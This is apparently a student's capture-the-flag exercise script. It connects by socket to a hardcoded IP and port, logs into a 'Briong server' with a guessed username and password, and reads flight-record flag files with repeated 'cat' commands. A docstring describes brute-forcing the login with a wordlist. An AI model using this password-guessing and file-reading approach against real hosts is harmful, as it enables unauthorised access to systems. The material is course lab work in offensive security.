"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
flightrecords = "/root/Documents/week2/flightrecordfiles.txt"
outputfile = "/root/Documents/week2/flightrecordflags.txt"

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
       How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

username = "kruegster"   # Hint: use OSINT
password = "pokemon"   # Hint: use wordlist

flightrecords_file = open(flightrecords, "r")
flightflags = open(outputfile, "w")
flightrecords_list = flightrecords_file.readlines()
i = 0
results = ['']

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

response = s.recv(1024)
#print("Connect: %s" % (response))
s.send(username + "\n")
response = s.recv(1024)
#print("___: %s" % (response))
s.send(password + "\n")
response = s.recv(1024)
#s.send("ls home/flight_records")
#print("Login! %s" % (response))

for flight in flightrecords_list:
	s.send("cat home/flight_records/" + flight)
	#print("Sending: %s" %(flight))
	response = s.recv(1024)
	print("%s" %(response))
	flightflags.write("%s\n" %(response))

'''
results = results.append(response)

for r in results:
	flightflags.write("%s\n" %r)
	print("Flag: %s" %(r))
'''

flightflags.close()
flightrecords_file.close()
s.close()

if __name__ == '__main__':
    brute_force()
